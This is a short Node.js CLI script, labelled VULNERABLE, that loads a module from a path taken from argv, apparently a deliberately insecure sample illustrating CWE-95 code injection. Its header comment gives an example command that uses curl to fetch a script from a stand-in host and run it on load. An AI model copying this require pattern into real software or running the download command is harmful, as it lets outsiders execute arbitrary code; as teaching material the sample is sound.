#!/usr/bin/env node
/**
 * VULNERABLE - a CLI entry point loading its config module from argv. The path
 * is named from outside the program, which is exactly CWE-95's requirement:
 * `mytool $(curl -s evil.sh -o /tmp/x.js; echo /tmp/x)` runs on load.
 */
'use strict';

const config = require(process.argv[2]);

function main() {
  console.log(JSON.stringify(config, null, 2));
}

main();
